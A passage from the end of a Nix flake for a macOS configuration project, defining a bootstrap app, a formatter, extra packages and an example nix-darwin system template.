                style = "minimal";
              };
            };
        }
        // nixpkgs.lib.optionalAttrs isDarwin {
          pounce = pounce.packages.${system}.default;
          perch = perch.packages.${system}.default;
        }
      );

      # `nix run github:hausfold/haus#bootstrap` — raise the house on a
      # fresh Mac. Scaffolds a thin personal config at ~/.config/nix; it never
      # touches this repo. Same script as the curl|bash path (bootstrap.sh).
      apps = nixpkgs.lib.genAttrs [ "aarch64-darwin" ] (system: {
        bootstrap = {
          type = "app";
          program = "${
            nixpkgs.legacyPackages.${system}.writeShellScriptBin "haus-bootstrap" (
              builtins.readFile ./bootstrap.sh
            )
          }/bin/haus-bootstrap";
        };
      });

      # `nix fmt` — nixfmt, the house style.
      formatter = nixpkgs.lib.genAttrs [ "aarch64-darwin" ] (
        system: nixpkgs.legacyPackages.${system}.nixfmt
      );

      # The template others copy. Build with:
      #   nix build .#darwinConfigurations.example.system
      darwinConfigurations.example = mkHaus {
        username = "you";
        hostname = "example";
      };
    };
}
